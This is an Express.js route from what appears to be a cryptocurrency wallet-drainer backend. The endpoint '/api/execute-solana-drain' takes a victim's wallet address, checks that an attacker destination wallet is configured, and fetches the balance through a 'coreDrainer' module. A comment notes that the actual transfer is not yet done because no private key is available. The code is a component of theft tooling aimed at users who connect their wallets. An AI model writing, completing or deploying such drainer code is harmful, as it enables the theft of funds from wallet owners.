
// Solana drain endpoint
app.post('/api/execute-solana-drain', async (req, res) => {
  try {
    const { userAddress } = req.body;
    console.log('🎯 Starting Solana drain for:', userAddress);
    
    if (!process.env.DESTINATION_WALLET_SOL) {
      return res.json({ 
        success: false, 
        error: 'Solana destination wallet not configured in environment' 
      });
    }
    
    // Get Solana balance
    const balance = await coreDrainer.getSolanaBalance(userAddress);
    console.log('💰 Solana balance:', balance);
    
    // For now, return balance info since we can't drain without private key
    res.json({ 
      success: true, 
      message: 'Solana balance checked successfully',
      balance: balance,
      destinationWallet: process.env.DESTINATION_WALLET_SOL,
      chain: 'solana'
    });
    
  } catch (error) {
    console.error('❌ Solana drain error:', error);
    res.json({ success: false, error: error.message });
  }
});

